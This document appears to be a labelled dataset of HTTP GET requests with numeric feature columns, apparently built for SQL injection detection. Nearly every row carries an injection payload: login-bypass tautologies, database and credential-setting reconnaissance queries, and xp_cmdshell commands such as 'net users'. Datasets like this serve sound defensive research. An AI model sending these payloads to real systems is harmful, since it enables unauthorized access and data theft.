62,1,200,6705,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,7120,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,7655,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
37,1,200,4273,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,1095,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2269,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2798,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2337,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
48,1,200,7403,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2262,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3837,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4251,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6329,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5211,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1527,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
35,1,200,1034,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,5938,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,4231,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,6997,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
52,1,200,1034,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3517,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,4968,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,5836,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,1606,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,4610,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
30,1,200,6840,7,4,8,1,1,GET ?id=) or ('1¡¬='1¡V HTTP/1.1
39,1,200,3731,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,3205,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2323,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,5746,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,3833,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,6263,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,4691,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,6029,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,6880,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,1094,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,6183,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
43,1,200,5083,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,7424,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,2517,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
49,1,200,6231,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
35,1,200,7631,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
35,1,200,2221,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
35,1,200,7826,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
36,1,200,2170,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,2712,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,7189,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
37,1,200,5977,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
37,1,200,2450,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
37,1,200,7031,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
74,1,200,5194,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,3425,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,5770,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,1713,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,3703,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,3618,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,3040,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,4052,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
87,1,200,7988,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,2667,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,6772,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,7400,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,5728,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,7608,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,4827,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
31,1,200,5340,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
31,1,200,7832,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
31,1,200,2284,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
26,1,200,7683,7,7,6,2,1,GET login/?id='-- HTTP/1.1
26,1,200,1162,7,7,6,2,1,GET login/?id='-- HTTP/1.1
49,1,200,7411,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
49,1,200,2500,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
25,1,200,5964,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
25,1,200,5437,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
56,1,200,4082,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,5921,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,4409,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
32,1,200,3103,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
32,1,200,5052,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
32,1,200,2329,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
38,1,200,2687,7,11,9,2,1,GET login/?id='or 1=1 or ''=' HTTP/1.1
35,1,200,1570,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2592,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,7756,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,5544,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
37,1,200,2599,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,4797,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,4174,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,5825,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,7958,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,7615,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,4469,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,2532,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,5188,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
37,1,200,3237,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
20,1,200,6518,7,2,6,1,1,GET ?id='^' HTTP/1.1
20,1,200,2349,7,2,6,1,1,GET ?id='^' HTTP/1.1
20,1,200,3802,7,2,6,1,1,GET ?id='^' HTTP/1.1
18,1,200,4167,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,2933,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,7239,7,2,4,1,0,GET ?id== HTTP/1.1
58,1,200,6607,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,2389,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,5815,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,5650,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,1434,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,6353,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,4308,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,7745,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,4689,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,4263,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
32,1,200,3822,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,4853,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,6854,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,5577,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,7800,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
57,1,200,2979,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,3152,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1141,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,3132,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,4643,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1553,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
38,1,200,7436,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
38,1,200,4432,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
38,1,200,4456,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
56,1,200,7235,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,7585,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,7292,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,6836,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,3441,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
49,1,200,5987,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,2107,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,2804,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,3329,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,7987,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2386,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,3651,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,4941,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,6745,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,3152,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,4928,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
47,1,200,3607,7,21,7,1,1,GET ?id=' group by userid having 1=1-- HTTP/1.1
47,1,200,7427,7,21,7,1,1,GET ?id=' group by userid having 1=1-- HTTP/1.1
34,1,200,6068,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
34,1,200,5041,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
34,1,200,4781,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
34,1,200,7269,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
68,1,200,7686,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3772,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7199,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
53,1,200,7878,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1192,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,6880,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1118,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
64,1,200,7534,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,2440,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1225,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6108,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6779,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
33,1,200,2306,7,9,7,2,1,GET login/?id=' or 1=1;# HTTP/1.1
32,1,200,5556,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,3784,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,7423,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
32,1,200,7552,7,9,5,2,1,GET login/?id=' or 1=1¡V HTTP/1.1
37,1,200,5898,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
33,1,200,2937,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
33,1,200,5656,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
33,1,200,2346,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
33,1,200,7540,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
56,1,200,7280,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,1218,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,5729,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,3521,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,2792,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
33,1,200,7501,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,6110,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,4391,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,2519,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,4382,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,6325,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,4492,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
33,1,200,5987,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
31,1,200,1128,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
31,1,200,7348,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
40,1,200,5420,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,3278,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2773,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,7703,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,6926,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2220,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
62,1,200,3278,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,3330,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,2779,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
59,1,200,5473,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,5318,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,2898,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,1770,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
26,1,200,5595,7,6,6,1,1,GET ?id= like '%' HTTP/1.1
26,1,200,4044,7,6,6,1,1,GET ?id= like '%' HTTP/1.1
58,1,200,7292,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5035,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,1095,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,3782,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6967,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,3474,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5463,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6357,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
55,1,200,6313,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3546,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,6653,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,7597,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3949,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
32,1,200,3678,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,7774,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,5351,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,6451,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
24,1,200,7831,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
24,1,200,5881,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
24,1,200,5920,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
44,1,200,6716,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
44,1,200,7893,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
18,1,200,6493,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2279,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,4984,7,2,4,1,1,GET ?id=' HTTP/1.1
39,1,200,7252,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
69,1,200,3915,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3438,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4022,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4707,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,6386,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
61,1,200,4562,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,2198,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,1877,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
54,1,200,7679,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,1180,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,3786,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,1634,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4795,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6795,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2276,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,7565,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2665,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6193,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4589,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
32,1,200,1076,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
75,1,200,1882,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6361,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2005,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,5060,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,5355,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3887,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,5816,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
81,1,200,1735,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,1318,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,2588,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,7843,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,2315,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,3404,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
43,1,200,3577,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,5488,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,7017,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,4848,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
20,2,200,1841,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,5145,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,2332,7,2,6,1,1,GET ?id='&' HTTP/1.1
24,1,200,6712,7,7,4,2,1,GET login/?id=' HTTP/1.1
32,2,200,7924,7,9,8,2,1,GET login/?id=' or ''&' HTTP/1.1
26,1,200,7430,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,1945,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
39,1,200,6785,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
26,1,200,3892,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,4388,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
20,1,200,5245,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,2114,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,3722,7,2,5,1,1,GET ?id=' # HTTP/1.1
36,1,200,3337,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
36,1,200,6301,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
65,1,200,7716,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,4299,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
61,1,200,6796,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,7250,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,7311,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,5905,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
63,1,200,4046,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,7161,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5340,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,7557,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,7404,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,6620,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,7398,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,3322,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
25,1,200,6637,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
25,1,200,1913,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
63,1,200,3280,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4521,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3736,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3121,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
80,1,200,4659,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7986,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7090,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,6164,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,5577,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,3234,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,3655,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,1402,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
44,1,200,2937,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
44,1,200,4280,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
